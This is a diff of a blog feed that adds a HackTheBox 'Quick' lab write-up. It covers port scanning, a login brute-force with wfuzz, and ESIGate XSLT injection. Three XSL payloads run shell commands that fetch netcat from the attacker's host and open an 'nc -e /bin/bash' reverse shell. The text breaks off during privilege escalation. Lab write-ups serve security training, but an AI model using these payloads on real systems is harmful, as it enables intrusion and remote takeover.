@@ -1,5 +1,431 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="https://xmehulx.github.io/write-ups/feed.xml" rel="self" type="application/atom+xml" /><link href="https://xmehulx.github.io/write-ups/" rel="alternate" type="text/html" /><updated>2020-05-02T14:11:20-04:00</updated><id>https://xmehulx.github.io/write-ups/</id><title>heisenb3rg</title><subtitle>Hackthebox writeups</subtitle><entry><title>“OpenAdmin” Write-up</title><link href="https://xmehulx.github.io/write-ups/openadmin/" rel="alternate" type="text/html" title="&quot;**OpenAdmin**&quot; Write-up" /><published>2020-05-02T00:00:00-04:00</published><updated>2020-05-02T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/openadmin</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/openadmin/">&lt;figure&gt;
-	&lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/openadmin/info.png&quot; /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="https://xmehulx.github.io/write-ups/feed.xml" rel="self" type="application/atom+xml" /><link href="https://xmehulx.github.io/write-ups/" rel="alternate" type="text/html" /><updated>2020-05-13T05:41:07-04:00</updated><id>https://xmehulx.github.io/write-ups/</id><title>heisenb3rg</title><subtitle>Hackthebox writeups</subtitle><entry><title>“Quick” Write-up</title><link href="https://xmehulx.github.io/write-ups/quick/" rel="alternate" type="text/html" title="&quot;**Quick**&quot; Write-up" /><published>2020-05-12T00:00:00-04:00</published><updated>2020-05-12T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/quick</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/quick/">&lt;figure&gt;
+        &lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/info.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;“Quick” is a hard-level Linux machine made by &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/13531&quot;&gt;MrR3boot&lt;/a&gt;, which focused on making use of HTTP3 protocol to gain initial foothold, exploiting ESIGATE vulnerability to gain user, winning race condition to parallel hop user and then basic linux skills to gain root.&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h2&gt;
+
+&lt;p&gt;Performing the regular nmap scan didn’t reveal everything because of which I got stuck at the beginning only. So, I performed &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sCVTU -A quick.htb&lt;/code&gt; which gave the following ports open:&lt;/p&gt;
+
+&lt;figure&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/nmap.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;I initially (when I didn’t perform UDP scan) checked the website at port 9001 and got a broadband website with only a couple of working links such as the “Get Started” page and the “clients” page and a non-working “portal” page.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/quick.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;I tried few default usernames and passwords in the login page and also few XSS attacks but didn’t work, so I ran a gobuster to get any directories for enumeration and found these:&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/gobuster.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;It had an completely empty &lt;strong&gt;db.php&lt;/strong&gt; page, which could indicate that it’s a complete php script because of which it couldn’t render on the website, so I kept that in mind and moved forward. Now I performed an UDP scan as well which gave an unique port 443 HTTPS. Simple wiki search revealed that it’s used by &lt;strong&gt;HTTP/3&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;
+
+&lt;h3 id=&quot;quiche&quot;&gt;Quiche&lt;/h3&gt;
+&lt;p&gt;This was the part that took most of the time and my sleep. Setting up Quiche was a nightmare for me. But &lt;a href=&quot;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&quot;&gt;this&lt;/a&gt; link and few stackoverflow searches helped me set it up a bit smoothly. You can ping me at my profile &lt;a href=&quot;https://www.hackthebox.eu/profile/112087&quot;&gt;@heisenb3rg&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, I ran cargo on the website and got the “portal” site, which linked to few other pages:&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/cargo-1.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;I looked at the “contacts” and “about” page which had a few email-ids, but the “docs” page had a &lt;strong&gt;connectivity.pdf&lt;/strong&gt; linked to it.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/cargo-2.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;I downloaded the pdf with the command:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cargo run &lt;span class=&quot;nt&quot;&gt;--manifest-path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;tools/apps/Cargo.toml &lt;span class=&quot;nt&quot;&gt;--bin&lt;/span&gt; quiche-client &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-verify&lt;/span&gt;  https://quick.htb/docs/Connectivity.pdf &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Connectivity.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;wfuzz&quot;&gt;WFUZZ&lt;/h3&gt;
+
+&lt;p&gt;The PDF contained a password ‘&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Quick4cc3$$&lt;/code&gt;&lt;/strong&gt;’ but no username for it. So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with the following command on the emails I collected from various pages from &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;cargo&lt;/code&gt; and got a hit!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://quick.htb:9001/login.php&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; email.lst &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;email=FUZZ&amp;amp;password=Quick4cc3&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,200
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/wfuzz.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;With this, I could login into the website!&lt;/p&gt;
+
+&lt;h2 id=&quot;esigate&quot;&gt;ESIGATE&lt;/h2&gt;
+
+&lt;h3 id=&quot;x-powered-by-header&quot;&gt;“X-Powered-By” Header&lt;/h3&gt;
+&lt;p&gt;The first thing that caught my eye was “&lt;strong&gt;Raise Ticket&lt;/strong&gt;” section. I saw the headers while requesting the home page and found that it was &lt;strong&gt;X-Powered-By: Esigate&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/esi.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Next, I looked up for an exploit for Esigate and found &lt;a href=&quot;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&quot;&gt;this blog&lt;/a&gt; which says that it was vulnerable to XSLT attack.&lt;/p&gt;
+
+&lt;h3 id=&quot;xslt-attack&quot;&gt;XSLT attack&lt;/h3&gt;
+&lt;p&gt;Now, according to the PoC in the blog I need an &lt;strong&gt;.xml&lt;/strong&gt; and an &lt;strong&gt;.xsl&lt;/strong&gt; file for each command I want to execute, and I needed to execute three commands:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Upload netcat&lt;/li&gt;
+  &lt;li&gt;Change permission of netcat&lt;/li&gt;
+  &lt;li&gt;Execute netcat to get a reverse shell&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The payload data of each request would be&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title&amp;amp;msg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;esi:include+src&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.15.87/&amp;lt;xml_file&amp;gt;&quot;&lt;/span&gt;+stylesheet&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.15.87/&amp;lt;xsl_file&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/esi:include&amp;gt;&amp;amp;id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TKT-&amp;lt;&lt;span class=&quot;c&quot;&gt;#&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So, I created three blank .xml files and three .xsl files as follows&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat upload.xsl
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:stylesheet&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsl=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/XSL/Transform&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:output&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xml&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;omit-xml-declaration=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:template&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;match=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;xmlns:xsl=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/XSL/Transform&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;xmlns:rt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;![CDATA[wget http://10.10.15.87:8888/nc]]&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:variable&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rtObj&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rt:getRuntime()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;process&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rt:exec($rtObj, $cmd)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Process: &lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:value-of&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$process&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Command: &lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:value-of&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$cmd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:template&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:stylesheet&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat chmod.xsl
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:stylesheet&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsl=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/XSL/Transform&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:output&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xml&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;omit-xml-declaration=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:template&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;match=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;xmlns:xsl=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/XSL/Transform&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;xmlns:rt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;![CDATA[chmod +x nc]]&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:variable&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rtObj&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rt:getRuntime()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;process&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rt:exec($rtObj, $cmd)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Process: &lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:value-of&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$process&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Command: &lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:value-of&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$cmd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:template&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:stylesheet&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat shell.xsl
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:stylesheet&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsl=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/XSL/Transform&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:output&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xml&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;omit-xml-declaration=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:template&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;match=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;xmlns:xsl=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/XSL/Transform&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;xmlns:rt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;![CDATA[./nc -e /bin/bash 10.10.15.87 4242]]&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:variable&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rtObj&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rt:getRuntime()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:variable&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;process&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rt:exec($rtObj, $cmd)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Process: &lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:value-of&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$process&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Command: &lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:value-of&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;select=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$cmd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:template&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xsl:stylesheet&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next I sent the request while raising ticket to the burpsuite repeater:&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/burp.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;user&quot;&gt;User&lt;/h2&gt;
+
+&lt;p&gt;My plan was to send a pair of .xml and .xsl file and then load the ticket to execute the .xsl script. So I ran my Python3 server, started a listener on the port and started uploading the files and executing the tickets one-by-one.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Uploading netcat&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/upload-burp.png&quot; /&gt;
+	&lt;figcaption&gt; Sending ticket request &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/upload-tkt.png&quot; /&gt;
+	&lt;figcaption&gt; Loading the ticket &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Changing permission&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/chmod-burp.png&quot; /&gt;
+	&lt;figcaption&gt; Sending ticket request &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/chmod-tkt.png&quot; /&gt;
+	&lt;figcaption&gt; Loading the ticket &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;ul&gt;
+  &lt;li&gt;Getting shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/shell-burp.png&quot; /&gt;
+	&lt;figcaption&gt; Sending ticket request &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/shell-tkt.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;I can confirm that the scripts were working as the files were being requested from my server.&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/server.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;p&gt;And I get a shell back!&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/user.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;parallel-hopping&quot;&gt;Parallel hopping&lt;/h2&gt;
+
+&lt;p&gt;Remember that “db.php” file I found at the beginning? I immediately went to look at it and found that it contained creds for a mysql user.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/db.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;mysql&quot;&gt;MySQL&lt;/h3&gt;
+&lt;p&gt;So I logged into MySQL database with this cred and found md5 encrypted password hash in the &lt;strong&gt;users table&lt;/strong&gt; inside the &lt;strong&gt;quick database&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/mysql.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;decrypting-md5&quot;&gt;Decrypting MD5&lt;/h3&gt;
+&lt;p&gt;I tried a lot to decrypt the key I got (tried john, hashcat and online decryptors), but got nothing. I enumerated more and found a file named &lt;strong&gt;index.php&lt;/strong&gt; in &lt;strong&gt;/var/www/printers/&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/salt.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;As the password was encrypted with a salt, it couldn’t be decrypted. Now I had to write a PHP script to decrypt it. I wrote the most basic script possible (as I am not well-versed with PHP).&lt;/p&gt;
+
+&lt;figure&gt;
